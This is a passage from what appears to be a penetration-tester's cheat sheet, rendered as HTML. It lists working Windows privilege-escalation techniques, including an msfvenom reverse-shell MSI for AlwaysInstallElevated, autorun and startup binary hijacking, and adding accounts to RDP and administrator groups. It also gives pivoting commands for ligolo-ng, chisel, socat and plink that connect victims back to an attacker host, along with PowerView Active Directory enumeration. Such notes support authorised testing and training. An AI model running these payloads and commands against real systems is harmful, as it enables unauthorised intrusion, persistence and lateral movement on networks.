</span><span id="__span-64-48"><a id="__codelineno-64-48" name="__codelineno-64-48" href="#__codelineno-64-48"></a>        <span class="no">[IO.File]</span><span class="p">::</span><span class="n">OpenWrite</span><span class="p">(</span><span class="s2">&quot;$_\x.txt&quot;</span><span class="p">).</span><span class="n">close</span><span class="p">()</span>
</span><span id="__span-64-49"><a id="__codelineno-64-49" name="__codelineno-64-49" href="#__codelineno-64-49"></a>        <span class="nb">Remove-Item</span> <span class="s2">&quot;$_\x.txt&quot;</span>
</span><span id="__span-64-50"><a id="__codelineno-64-50" name="__codelineno-64-50" href="#__codelineno-64-50"></a>        <span class="nv">$WritableDirectory</span> <span class="p">=</span> <span class="nv">$_</span>
</span><span id="__span-64-51"><a id="__codelineno-64-51" name="__codelineno-64-51" href="#__codelineno-64-51"></a>    <span class="p">}</span> <span class="k">catch</span> <span class="p">{}</span>
</span><span id="__span-64-52"><a id="__codelineno-64-52" name="__codelineno-64-52" href="#__codelineno-64-52"></a><span class="p">}</span>
</span><span id="__span-64-53"><a id="__codelineno-64-53" name="__codelineno-64-53" href="#__codelineno-64-53"></a>
</span><span id="__span-64-54"><a id="__codelineno-64-54" name="__codelineno-64-54" href="#__codelineno-64-54"></a><span class="k">if</span> <span class="p">(</span><span class="nv">$WritableDirectory</span> <span class="o">-eq</span> <span class="nv">$null</span><span class="p">)</span> <span class="p">{</span>
</span><span id="__span-64-55"><a id="__codelineno-64-55" name="__codelineno-64-55" href="#__codelineno-64-55"></a>    <span class="nb">Write-Host</span> <span class="s2">&quot;No writable directories in PATH, FJTWSVIC is not exploitable&quot;</span>
</span><span id="__span-64-56"><a id="__codelineno-64-56" name="__codelineno-64-56" href="#__codelineno-64-56"></a>    <span class="n">Exit</span> <span class="n">1</span>
</span><span id="__span-64-57"><a id="__codelineno-64-57" name="__codelineno-64-57" href="#__codelineno-64-57"></a><span class="p">}</span>
</span></code></pre></div>
<h5 id="to-check-service-permissions">To check service permissions</h5>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-65-1"><a id="__codelineno-65-1" name="__codelineno-65-1" href="#__codelineno-65-1"></a><span class="nb">sc </span><span class="n">sdshow</span> <span class="p">&lt;</span><span class="n">ServiceName</span><span class="p">&gt;</span>
</span></code></pre></div>
<p>Each ACE follows this pattern: <code>(A;;permissions;;;SID)</code> whereas in <code>(A;FA;permissions;;;SID)</code> , <code>FA</code> to do failed audit logging for specified permissions.</p>
<p><strong>Common Permission Codes:</strong>
- <strong>CC</strong> - SERVICE_QUERY_CONFIG
- <strong>DC</strong> - Change_Config
- <strong>LC</strong> - SERVICE_QUERY_STATUS
- <strong>SW</strong> - SERVICE_ENUMERATE_DEPENDENTS
- <strong>RP</strong> - SERVICE_START
- <strong>WP</strong> - SERVICE_STOP
- <strong>DT</strong> - SERVICE_PAUSE_CONTINUE
- <strong>LO</strong> - SERVICE_INTERROGATE
- <strong>CR</strong> - SERVICE_USER_DEFINED_CONTROL
- <strong>RC</strong> - READ_CONTROL
- <strong>WD</strong> - WRITE_DAC
- <strong>WO</strong> - WRITE_OWNER
- <strong>SD</strong> - DELETE</p>
<h4 id="always-install-elevated-msi">Always Install Elevated - MSI</h4>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-66-1"><a id="__codelineno-66-1" name="__codelineno-66-1" href="#__codelineno-66-1"></a><span class="n">reg</span> <span class="n">query</span> <span class="n">HKLM</span><span class="p">\</span><span class="n">Software</span><span class="p">\</span><span class="n">Policies</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Installer</span>
</span><span id="__span-66-2"><a id="__codelineno-66-2" name="__codelineno-66-2" href="#__codelineno-66-2"></a><span class="n">reg</span> <span class="n">query</span> <span class="n">HKCU</span><span class="p">\</span><span class="n">Software</span><span class="p">\</span><span class="n">Policies</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Installer</span>
</span><span id="__span-66-3"><a id="__codelineno-66-3" name="__codelineno-66-3" href="#__codelineno-66-3"></a><span class="c"># if both value set to 1 in AlwaysInstallElevated</span>
</span><span id="__span-66-4"><a id="__codelineno-66-4" name="__codelineno-66-4" href="#__codelineno-66-4"></a><span class="n">msfvenom</span> <span class="n">-p</span> <span class="n">windows</span><span class="p">/</span><span class="n">x64</span><span class="p">/</span><span class="n">shell_reverse_tcp</span> <span class="n">LHOST</span><span class="p">=&lt;</span><span class="n">IP</span><span class="p">&gt;</span> <span class="n">LPORT</span><span class="p">=&lt;</span><span class="n">PORT</span><span class="p">&gt;</span> <span class="o">-f</span> <span class="n">msi</span> <span class="p">&gt;</span> <span class="n">reverse</span><span class="p">.</span><span class="n">msi</span>
</span><span id="__span-66-5"><a id="__codelineno-66-5" name="__codelineno-66-5" href="#__codelineno-66-5"></a><span class="n">msiexec</span> <span class="p">/</span><span class="n">quiet</span> <span class="p">/</span><span class="n">qn</span> <span class="p">/</span><span class="n">i</span> <span class="n">C</span><span class="p">:\</span><span class="n">Temp</span><span class="p">\</span><span class="n">setup</span><span class="p">.</span><span class="n">msi</span> <span class="c"># to install malicious msi with elevated perms</span>
</span></code></pre></div>
<h4 id="autorun-program-hijack-or-startup-app">AutoRun Program Hijack Or Startup App</h4>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-67-1"><a id="__codelineno-67-1" name="__codelineno-67-1" href="#__codelineno-67-1"></a><span class="c"># AutoRun Program Hijack</span>
</span><span id="__span-67-2"><a id="__codelineno-67-2" name="__codelineno-67-2" href="#__codelineno-67-2"></a><span class="n">reg</span> <span class="n">query</span> <span class="n">HKLM</span><span class="p">\</span><span class="n">SOFTWARE</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">CurrentVersion</span><span class="p">\</span><span class="n">Run</span>
</span><span id="__span-67-3"><a id="__codelineno-67-3" name="__codelineno-67-3" href="#__codelineno-67-3"></a><span class="n">Autorun64</span><span class="p">.</span><span class="n">exe</span> <span class="c"># to check autorun programs and their dir</span>
</span><span id="__span-67-4"><a id="__codelineno-67-4" name="__codelineno-67-4" href="#__codelineno-67-4"></a><span class="n">accesschk64</span><span class="p">.</span><span class="n">exe</span> <span class="n">-wvu</span> <span class="s2">&quot;C:\Program Files\Autorun Program</span>
</span><span id="__span-67-5"><a id="__codelineno-67-5" name="__codelineno-67-5" href="#__codelineno-67-5"></a><span class="s2"># if has the perms to change the binary then replace with the malicious one</span>
</span><span id="__span-67-6"><a id="__codelineno-67-6" name="__codelineno-67-6" href="#__codelineno-67-6"></a><span class="s2"># logoff and logon</span>
</span><span id="__span-67-7"><a id="__codelineno-67-7" name="__codelineno-67-7" href="#__codelineno-67-7"></a>
</span><span id="__span-67-8"><a id="__codelineno-67-8" name="__codelineno-67-8" href="#__codelineno-67-8"></a><span class="s2"># Startup Application</span>
</span><span id="__span-67-9"><a id="__codelineno-67-9" name="__codelineno-67-9" href="#__codelineno-67-9"></a><span class="s2">icacls &quot;</span><span class="n">C</span><span class="p">:\</span><span class="n">ProgramData</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="nb">Start </span><span class="n">Menu</span><span class="p">\</span><span class="n">Programs</span><span class="p">\</span><span class="n">Startup</span><span class="s2">&quot;</span>
</span><span id="__span-67-10"><a id="__codelineno-67-10" name="__codelineno-67-10" href="#__codelineno-67-10"></a><span class="s2"># if we have permissions then drop in case any admin logs in at the startup it will gonna trigger malicious binary</span>
</span></code></pre></div>
<h4 id="bypass-uac">Bypass UAC</h4>
<h3 id="useful-commands">Useful commands</h3>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-68-1"><a id="__codelineno-68-1" name="__codelineno-68-1" href="#__codelineno-68-1"></a><span class="n">net</span> <span class="n">localgroup</span> <span class="s2">&quot;Remote Desktop Users&quot;</span> <span class="p">/</span><span class="n">add</span> <span class="n">user</span>  <span class="c"># in case RDP open, PREFERRED</span>
</span><span id="__span-68-2"><a id="__codelineno-68-2" name="__codelineno-68-2" href="#__codelineno-68-2"></a><span class="n">net</span> <span class="n">localgroup</span> <span class="s2">&quot;Remote Management Users&quot;</span> <span class="p">/</span><span class="n">add</span> <span class="n">user</span>  <span class="c"># in case RDP closed and WinRM open</span>
</span><span id="__span-68-3"><a id="__codelineno-68-3" name="__codelineno-68-3" href="#__codelineno-68-3"></a>
</span><span id="__span-68-4"><a id="__codelineno-68-4" name="__codelineno-68-4" href="#__codelineno-68-4"></a><span class="nb">Add-LocalGroupMember</span> <span class="n">-Group</span> <span class="n">Administartors</span> <span class="n">-Member</span> <span class="n">ariah</span>
</span></code></pre></div>
<h2 id="pivoting-commands">⛓ Pivoting Commands</h2>
<p>Check this [[Pivoting]]</p>
<h3 id="ligolo-ng">Ligolo-ng</h3>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-69-1"><a id="__codelineno-69-1" name="__codelineno-69-1" href="#__codelineno-69-1"></a><span class="c1"># [[Pivoting#Ligolo-ng]] preferred for setting up internet network route and listener for easier pivoting</span>
</span><span id="__span-69-2"><a id="__codelineno-69-2" name="__codelineno-69-2" href="#__codelineno-69-2"></a>sudo<span class="w"> </span>ligolo-proxy<span class="w"> </span>-selfcert
</span><span id="__span-69-3"><a id="__codelineno-69-3" name="__codelineno-69-3" href="#__codelineno-69-3"></a>
</span><span id="__span-69-4"><a id="__codelineno-69-4" name="__codelineno-69-4" href="#__codelineno-69-4"></a>ifcreate<span class="w"> </span>--name<span class="w"> </span><span class="s2">&quot;ligolo&quot;</span>
</span><span id="__span-69-5"><a id="__codelineno-69-5" name="__codelineno-69-5" href="#__codelineno-69-5"></a>
</span><span id="__span-69-6"><a id="__codelineno-69-6" name="__codelineno-69-6" href="#__codelineno-69-6"></a><span class="c1"># victim side </span>
</span><span id="__span-69-7"><a id="__codelineno-69-7" name="__codelineno-69-7" href="#__codelineno-69-7"></a>./agent<span class="w"> </span>-connect<span class="w"> </span>&lt;attackerip&gt;:11601<span class="w"> </span>-ignore-cert
</span><span id="__span-69-8"><a id="__codelineno-69-8" name="__codelineno-69-8" href="#__codelineno-69-8"></a>
</span><span id="__span-69-9"><a id="__codelineno-69-9" name="__codelineno-69-9" href="#__codelineno-69-9"></a>session<span class="w"> </span><span class="c1"># seelct</span>
</span><span id="__span-69-10"><a id="__codelineno-69-10" name="__codelineno-69-10" href="#__codelineno-69-10"></a>ifconfig<span class="w"> </span><span class="c1"># check for the route</span>
</span><span id="__span-69-11"><a id="__codelineno-69-11" name="__codelineno-69-11" href="#__codelineno-69-11"></a>route_add<span class="w"> </span>--name<span class="w"> </span><span class="s2">&quot;ligolo&quot;</span><span class="w"> </span>--route<span class="w"> </span><span class="s2">&quot;10.0.2.0/24&quot;</span>
</span><span id="__span-69-12"><a id="__codelineno-69-12" name="__codelineno-69-12" href="#__codelineno-69-12"></a>start<span class="w"> </span>--tun<span class="w"> </span><span class="s2">&quot;ligolo&quot;</span>
</span><span id="__span-69-13"><a id="__codelineno-69-13" name="__codelineno-69-13" href="#__codelineno-69-13"></a>
</span><span id="__span-69-14"><a id="__codelineno-69-14" name="__codelineno-69-14" href="#__codelineno-69-14"></a><span class="c1"># for double pivoting </span>
</span><span id="__span-69-15"><a id="__codelineno-69-15" name="__codelineno-69-15" href="#__codelineno-69-15"></a>listener_add<span class="w"> </span>--addr<span class="w"> </span><span class="m">0</span>.0.0.0:8001<span class="w"> </span>--to<span class="w"> </span><span class="m">127</span>.0.0.1:8000<span class="w"> </span>--tcp<span class="w">  </span><span class="c1"># to deliver the ligolo binary to another host for double pivot so opening listener on agent</span>
</span><span id="__span-69-16"><a id="__codelineno-69-16" name="__codelineno-69-16" href="#__codelineno-69-16"></a>listener_add<span class="w"> </span>--addr<span class="w"> </span><span class="m">0</span>.0.0.0:11601<span class="w"> </span>--to<span class="w"> </span><span class="m">127</span>.0.0.1:11601<span class="w"> </span>--tcp<span class="w"> </span><span class="c1"># get back the connection of 2nd agent through 1st agent</span>
</span><span id="__span-69-17"><a id="__codelineno-69-17" name="__codelineno-69-17" href="#__codelineno-69-17"></a><span class="c1"># for second pivot</span>
</span><span id="__span-69-18"><a id="__codelineno-69-18" name="__codelineno-69-18" href="#__codelineno-69-18"></a>ifcreate<span class="w"> </span>--name<span class="w"> </span><span class="s2">&quot;ligolo-second&quot;</span>
</span><span id="__span-69-19"><a id="__codelineno-69-19" name="__codelineno-69-19" href="#__codelineno-69-19"></a>session<span class="w"> </span><span class="c1"># seelct</span>
</span><span id="__span-69-20"><a id="__codelineno-69-20" name="__codelineno-69-20" href="#__codelineno-69-20"></a>ifconfig<span class="w"> </span><span class="c1"># check for the route</span>
</span><span id="__span-69-21"><a id="__codelineno-69-21" name="__codelineno-69-21" href="#__codelineno-69-21"></a>route_add<span class="w"> </span>--name<span class="w"> </span><span class="s2">&quot;ligolo-second&quot;</span><span class="w"> </span>--route<span class="w"> </span><span class="s2">&quot;172.10.2.0/24&quot;</span>
</span><span id="__span-69-22"><a id="__codelineno-69-22" name="__codelineno-69-22" href="#__codelineno-69-22"></a>start<span class="w"> </span>--tun<span class="w"> </span><span class="s2">&quot;ligolo-second&quot;</span>
</span><span id="__span-69-23"><a id="__codelineno-69-23" name="__codelineno-69-23" href="#__codelineno-69-23"></a>
</span><span id="__span-69-24"><a id="__codelineno-69-24" name="__codelineno-69-24" href="#__codelineno-69-24"></a><span class="c1"># in case if the route is already present to your machine then use host specfic subnet liek 192.168.10.12/32</span>
</span><span id="__span-69-25"><a id="__codelineno-69-25" name="__codelineno-69-25" href="#__codelineno-69-25"></a>
</span><span id="__span-69-26"><a id="__codelineno-69-26" name="__codelineno-69-26" href="#__codelineno-69-26"></a><span class="c1"># to route to locally running port on your agent machine</span>
</span><span id="__span-69-27"><a id="__codelineno-69-27" name="__codelineno-69-27" href="#__codelineno-69-27"></a>sudo<span class="w"> </span>ip<span class="w"> </span>route<span class="w"> </span>add<span class="w"> </span><span class="m">240</span>.0.0.1/32<span class="w"> </span>dev<span class="w"> </span>ligolo<span class="w"> </span>
</span><span id="__span-69-28"><a id="__codelineno-69-28" name="__codelineno-69-28" href="#__codelineno-69-28"></a><span class="c1"># where 240.0.0.1 is your agent local ip</span>
</span></code></pre></div>
<h3 id="chisel">Chisel</h3>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-70-1"><a id="__codelineno-70-1" name="__codelineno-70-1" href="#__codelineno-70-1"></a><span class="c1"># REVERSE/Remote Port Forward</span>
</span><span id="__span-70-2"><a id="__codelineno-70-2" name="__codelineno-70-2" href="#__codelineno-70-2"></a><span class="c1"># attacking machine</span>
</span><span id="__span-70-3"><a id="__codelineno-70-3" name="__codelineno-70-3" href="#__codelineno-70-3"></a>chisel<span class="w"> </span>server<span class="w"> </span>-p<span class="w"> </span><span class="m">11701</span><span class="w"> </span>--reverse<span class="w"> </span><span class="p">&amp;</span><span class="w"> </span><span class="c1"># we can listen on any port, but i create 11701 for the standard</span>
</span><span id="__span-70-4"><a id="__codelineno-70-4" name="__codelineno-70-4" href="#__codelineno-70-4"></a>
</span><span id="__span-70-5"><a id="__codelineno-70-5" name="__codelineno-70-5" href="#__codelineno-70-5"></a><span class="c1"># jump box</span>
</span><span id="__span-70-6"><a id="__codelineno-70-6" name="__codelineno-70-6" href="#__codelineno-70-6"></a>./chisel<span class="w"> </span>client<span class="w"> </span>ATTACKING_IP:11701<span class="w"> </span>R:LOCAL_PORT:TARGET_IP:TARGET_PORT<span class="w"> </span><span class="p">&amp;</span>
</span><span id="__span-70-7"><a id="__codelineno-70-7" name="__codelineno-70-7" href="#__codelineno-70-7"></a>
</span><span id="__span-70-8"><a id="__codelineno-70-8" name="__codelineno-70-8" href="#__codelineno-70-8"></a>./chisel.exe<span class="w"> </span>client<span class="w"> </span><span class="m">192</span>.168.45.155:11701<span class="w"> </span>R:9980:127.0.0.1:80<span class="w"> </span><span class="p">&amp;</span>
</span></code></pre></div>
<h3 id="more_1">More</h3>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-71-1"><a id="__codelineno-71-1" name="__codelineno-71-1" href="#__codelineno-71-1"></a><span class="c1"># [[Pivoting#SSH Port-forwarding Tunneling]] can check out this too</span>
</span><span id="__span-71-2"><a id="__codelineno-71-2" name="__codelineno-71-2" href="#__codelineno-71-2"></a>ssh<span class="w"> </span>tunneluser@1.1.1.1<span class="w"> </span>-L<span class="w"> </span>*:80:127.0.0.1:80<span class="w"> </span>-N
</span><span id="__span-71-3"><a id="__codelineno-71-3" name="__codelineno-71-3" href="#__codelineno-71-3"></a>
</span><span id="__span-71-4"><a id="__codelineno-71-4" name="__codelineno-71-4" href="#__codelineno-71-4"></a><span class="c1"># Port Forwarding Using Socat</span>
</span><span id="__span-71-5"><a id="__codelineno-71-5" name="__codelineno-71-5" href="#__codelineno-71-5"></a><span class="c1"># Linux victim Machine</span>
</span><span id="__span-71-6"><a id="__codelineno-71-6" name="__codelineno-71-6" href="#__codelineno-71-6"></a>socat<span class="w"> </span>-ddd<span class="w"> </span>TCP4-LISTEN:3389,fork<span class="w"> </span>TCP4:3.3.3.3:3389<span class="w"> </span>
</span><span id="__span-71-7"><a id="__codelineno-71-7" name="__codelineno-71-7" href="#__codelineno-71-7"></a>
</span><span id="__span-71-8"><a id="__codelineno-71-8" name="__codelineno-71-8" href="#__codelineno-71-8"></a><span class="c1"># plink for ssh remote port forwarding if our attacking machine hosting ssh server and we wanna access internal victim rdp port</span>
</span><span id="__span-71-9"><a id="__codelineno-71-9" name="__codelineno-71-9" href="#__codelineno-71-9"></a>cmd.exe<span class="w"> </span>/c<span class="w"> </span><span class="nb">echo</span><span class="w"> </span>y<span class="w"> </span><span class="p">|</span><span class="w"> </span>C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\p</span>link.exe<span class="w"> </span>-ssh<span class="w"> </span>-l<span class="w"> </span>kali<span class="w"> </span>-pw<span class="w"> </span>&lt;YOUR<span class="w"> </span>PASSWORD<span class="w"> </span>HERE&gt;<span class="w"> </span>-R<span class="w"> </span><span class="m">127</span>.0.0.1:9833:127.0.0.1:3389<span class="w"> </span><span class="m">192</span>.168.118.4
</span><span id="__span-71-10"><a id="__codelineno-71-10" name="__codelineno-71-10" href="#__codelineno-71-10"></a><span class="c1"># we can&#39;t respond back to promppts on non-TTY windows shell just like linux then we can automate the process of sending yes through echo</span>
</span><span id="__span-71-11"><a id="__codelineno-71-11" name="__codelineno-71-11" href="#__codelineno-71-11"></a>
</span><span id="__span-71-12"><a id="__codelineno-71-12" name="__codelineno-71-12" href="#__codelineno-71-12"></a><span class="c1"># native to windows but requires high privs</span>
</span><span id="__span-71-13"><a id="__codelineno-71-13" name="__codelineno-71-13" href="#__codelineno-71-13"></a>netsh<span class="w"> </span>interface<span class="w"> </span>portproxy<span class="w"> </span>add<span class="w"> </span>v4tov4<span class="w"> </span><span class="nv">listenport</span><span class="o">=</span><span class="m">2222</span><span class="w"> </span><span class="nv">listenaddress</span><span class="o">=</span><span class="m">192</span>.168.50.64<span class="w"> </span><span class="nv">connectport</span><span class="o">=</span><span class="m">22</span><span class="w"> </span><span class="nv">connectaddress</span><span class="o">=</span><span class="m">10</span>.4.50.215
</span><span id="__span-71-14"><a id="__codelineno-71-14" name="__codelineno-71-14" href="#__codelineno-71-14"></a><span class="c1"># if we have high privs the obviously we can also open some ports in firewall</span>
</span><span id="__span-71-15"><a id="__codelineno-71-15" name="__codelineno-71-15" href="#__codelineno-71-15"></a>netsh<span class="w"> </span>advfirewall<span class="w"> </span>firewall<span class="w"> </span>add<span class="w"> </span>rule<span class="w"> </span><span class="nv">name</span><span class="o">=</span><span class="s2">&quot;port_forward_ssh_2222&quot;</span><span class="w"> </span><span class="nv">protocol</span><span class="o">=</span>TCP<span class="w"> </span><span class="nv">dir</span><span class="o">=</span><span class="k">in</span><span class="w"> </span><span class="nv">localip</span><span class="o">=</span><span class="m">192</span>.168.50.64<span class="w"> </span><span class="nv">localport</span><span class="o">=</span><span class="m">2222</span><span class="w"> </span><span class="nv">action</span><span class="o">=</span>allow
</span><span id="__span-71-16"><a id="__codelineno-71-16" name="__codelineno-71-16" href="#__codelineno-71-16"></a><span class="c1"># delete this rule and portfwd after engagement</span>
</span><span id="__span-71-17"><a id="__codelineno-71-17" name="__codelineno-71-17" href="#__codelineno-71-17"></a>netsh<span class="w"> </span>advfirewall<span class="w"> </span>firewall<span class="w"> </span>delete<span class="w"> </span>rule<span class="w"> </span><span class="nv">name</span><span class="o">=</span><span class="s2">&quot;port_forward_ssh_2222&quot;</span>
</span><span id="__span-71-18"><a id="__codelineno-71-18" name="__codelineno-71-18" href="#__codelineno-71-18"></a>netsh<span class="w"> </span>interface<span class="w"> </span>portproxy<span class="w"> </span>del<span class="w"> </span>v4tov4<span class="w"> </span><span class="nv">listenport</span><span class="o">=</span><span class="m">2222</span><span class="w"> </span><span class="nv">listenaddress</span><span class="o">=</span><span class="m">192</span>.168.50.64
</span></code></pre></div>
<h2 id="active-directory">🗃<font color="#d99694">Active Directory</font></h2>
<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md">PayloadAllTheThings AD Attacks</a></p>
<h3 id="enumeration_2">🔍Enumeration</h3>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-72-1"><a id="__codelineno-72-1" name="__codelineno-72-1" href="#__codelineno-72-1"></a><span class="n">net</span> <span class="n">user</span> <span class="p">/</span><span class="n">domain</span>
</span><span id="__span-72-2"><a id="__codelineno-72-2" name="__codelineno-72-2" href="#__codelineno-72-2"></a><span class="n">net</span> <span class="n">user</span> <span class="n">username</span> <span class="p">/</span><span class="n">domain</span>
</span><span id="__span-72-3"><a id="__codelineno-72-3" name="__codelineno-72-3" href="#__codelineno-72-3"></a><span class="n">net</span> <span class="nb">group </span><span class="p">/</span><span class="n">domain</span>
</span><span id="__span-72-4"><a id="__codelineno-72-4" name="__codelineno-72-4" href="#__codelineno-72-4"></a><span class="n">net</span> <span class="nb">group </span><span class="p">&lt;</span><span class="n">groupname</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">domain</span>
</span><span id="__span-72-5"><a id="__codelineno-72-5" name="__codelineno-72-5" href="#__codelineno-72-5"></a><span class="n">net</span> <span class="n">accounts</span> <span class="c"># before doing pass attack to check account lockout policies</span>
</span><span id="__span-72-6"><a id="__codelineno-72-6" name="__codelineno-72-6" href="#__codelineno-72-6"></a><span class="nb">Get-NetUser</span> <span class="p">|</span> <span class="nb">select </span><span class="n">name</span><span class="p">,</span><span class="n">badpwdcount</span><span class="p">,</span><span class="n">badpasswordtime</span> <span class="c"># for check bad pass attempt</span>
</span><span id="__span-72-7"><a id="__codelineno-72-7" name="__codelineno-72-7" href="#__codelineno-72-7"></a>
</span><span id="__span-72-8"><a id="__codelineno-72-8" name="__codelineno-72-8" href="#__codelineno-72-8"></a>
</span><span id="__span-72-9"><a id="__codelineno-72-9" name="__codelineno-72-9" href="#__codelineno-72-9"></a><span class="c"># Powershell AD enumeration cmdlets comes with RSAT that&#39;s rarely present on client in a domain.</span>
</span><span id="__span-72-10"><a id="__codelineno-72-10" name="__codelineno-72-10" href="#__codelineno-72-10"></a><span class="c"># we can use alternative commands to directly communicate through LDAP to query AD objects</span>
</span><span id="__span-72-11"><a id="__codelineno-72-11" name="__codelineno-72-11" href="#__codelineno-72-11"></a><span class="no">[System.DirectoryServices.ActiveDirectory.Domain]</span><span class="p">::</span><span class="n">GetCurrentDomain</span><span class="p">()</span>  <span class="c"># to get domain info i.e. primary domain controller</span>
</span><span id="__span-72-12"><a id="__codelineno-72-12" name="__codelineno-72-12" href="#__codelineno-72-12"></a><span class="p">(</span><span class="no">[adsi]</span><span class="s1">&#39;&#39;</span><span class="p">).</span><span class="n">distinguishedName</span>  <span class="c"># &#39;&#39; to start search at top of AD hierarchy</span>
</span><span id="__span-72-13"><a id="__codelineno-72-13" name="__codelineno-72-13" href="#__codelineno-72-13"></a>
</span><span id="__span-72-14"><a id="__codelineno-72-14" name="__codelineno-72-14" href="#__codelineno-72-14"></a>
</span><span id="__span-72-15"><a id="__codelineno-72-15" name="__codelineno-72-15" href="#__codelineno-72-15"></a><span class="c"># PowerView.ps1 for manual  [Reference of All PowerView Functions](https://powersploit.readthedocs.io/en/latest/Recon/)</span>
</span><span id="__span-72-16"><a id="__codelineno-72-16" name="__codelineno-72-16" href="#__codelineno-72-16"></a><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">PowerView</span><span class="p">.</span><span class="n">ps1</span>
</span><span id="__span-72-17"><a id="__codelineno-72-17" name="__codelineno-72-17" href="#__codelineno-72-17"></a><span class="nb">Get-NetDomain</span>
</span><span id="__span-72-18"><a id="__codelineno-72-18" name="__codelineno-72-18" href="#__codelineno-72-18"></a><span class="nb">Get-NetUser</span> <span class="p">|</span> <span class="nb">select </span><span class="n">cn</span>
</span><span id="__span-72-19"><a id="__codelineno-72-19" name="__codelineno-72-19" href="#__codelineno-72-19"></a><span class="nb">Get-NetUser</span> <span class="p">|</span> <span class="nb">select </span><span class="n">cn</span><span class="p">,</span><span class="n">pwdlastset</span><span class="p">,</span><span class="n">lastlogon</span>  <span class="c"># for finding dormant user accounts</span>
</span><span id="__span-72-20"><a id="__codelineno-72-20" name="__codelineno-72-20" href="#__codelineno-72-20"></a><span class="nb">Get-NetUser</span> <span class="n">-PreauthNotRequired</span> <span class="c"># to list down AS-REP roastable user accounts</span>
</span><span id="__span-72-21"><a id="__codelineno-72-21" name="__codelineno-72-21" href="#__codelineno-72-21"></a><span class="nb">Get-NetUser</span> <span class="n">-Spn</span>
</span><span id="__span-72-22"><a id="__codelineno-72-22" name="__codelineno-72-22" href="#__codelineno-72-22"></a><span class="nb">Get-NetUser</span> <span class="n">-Filter</span> <span class="p">{</span><span class="n">SamAccountName</span> <span class="o">-eq</span> <span class="s2">&quot;username&quot;</span><span class="p">}</span>
</span><span id="__span-72-23"><a id="__codelineno-72-23" name="__codelineno-72-23" href="#__codelineno-72-23"></a>
</span><span id="__span-72-24"><a id="__codelineno-72-24" name="__codelineno-72-24" href="#__codelineno-72-24"></a>
</span><span id="__span-72-25"><a id="__codelineno-72-25" name="__codelineno-72-25" href="#__codelineno-72-25"></a><span class="nb">Get-NetGroup</span> <span class="p">|</span> <span class="nb">select </span><span class="n">cn</span>
</span><span id="__span-72-26"><a id="__codelineno-72-26" name="__codelineno-72-26" href="#__codelineno-72-26"></a><span class="nb">Get-NetGroup</span> <span class="s2">&quot;Sales Department&quot;</span> <span class="p">|</span> <span class="nb">select </span><span class="n">member</span>   <span class="c"># powerview can also list nested groups too</span>
</span><span id="__span-72-27"><a id="__codelineno-72-27" name="__codelineno-72-27" href="#__codelineno-72-27"></a><span class="nb">Get-NetComputer</span> <span class="p">|</span> <span class="nb">select </span><span class="n">operatingsystem</span><span class="p">,</span><span class="n">dnshostname</span>
</span><span id="__span-72-28"><a id="__codelineno-72-28" name="__codelineno-72-28" href="#__codelineno-72-28"></a><span class="nb">Find-LocalAdminAccess</span> <span class="c"># finds if current user has admin privs on any computers in the domain</span>
</span><span id="__span-72-29"><a id="__codelineno-72-29" name="__codelineno-72-29" href="#__codelineno-72-29"></a><span class="c"># the below command sometimes get buggy and restricted</span>
</span><span id="__span-72-30"><a id="__codelineno-72-30" name="__codelineno-72-30" href="#__codelineno-72-30"></a><span class="c"># The permissions required to enumerate sessions with NetSessionEnum are defined in the SrvsvcSessionInfo registry key, which is located in the HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity hive.</span>
</span><span id="__span-72-31"><a id="__codelineno-72-31" name="__codelineno-72-31" href="#__codelineno-72-31"></a><span class="nb">Get-NetSession</span> <span class="n">-ComputerName</span> <span class="p">&lt;</span><span class="n">compname</span><span class="p">&gt;</span>  <span class="n">-Verbose</span> <span class="c"># checks for any logged in users </span>
</span><span id="__span-72-32"><a id="__codelineno-72-32" name="__codelineno-72-32" href="#__codelineno-72-32"></a><span class="c"># to check for the perms of net session enumeration</span>
</span><span id="__span-72-33"><a id="__codelineno-72-33" name="__codelineno-72-33" href="#__codelineno-72-33"></a><span class="nb">Get-Acl</span> <span class="n">-Path</span> <span class="n">HKLM</span><span class="p">:</span><span class="n">SYSTEM</span><span class="p">\</span><span class="n">CurrentControlSet</span><span class="p">\</span><span class="n">Services</span><span class="p">\</span><span class="n">LanmanServer</span><span class="p">\</span><span class="n">DefaultSecurity</span><span class="p">\</span> <span class="p">|</span> <span class="nb">fl</span>
</span><span id="__span-72-34"><a id="__codelineno-72-34" name="__codelineno-72-34" href="#__codelineno-72-34"></a><span class="c"># alternative to Get-NetSession because this doesn&#39;t work in latest windows </span>
</span><span id="__span-72-35"><a id="__codelineno-72-35" name="__codelineno-72-35" href="#__codelineno-72-35"></a><span class="n">PsLoggedOn</span> <span class="p">\\&lt;</span><span class="n">compname</span><span class="p">&gt;</span> <span class="c"># this relies of remote registry service to be enabled which isn&#39;t enabled by default on workstations but can be enabled on server</span>
</span><span id="__span-72-36"><a id="__codelineno-72-36" name="__codelineno-72-36" href="#__codelineno-72-36"></a>
</span><span id="__span-72-37"><a id="__codelineno-72-37" name="__codelineno-72-37" href="#__codelineno-72-37"></a><span class="n">setspn</span> <span class="n">-L</span> <span class="n">iis_service</span> <span class="c"># installed by default on windows</span>
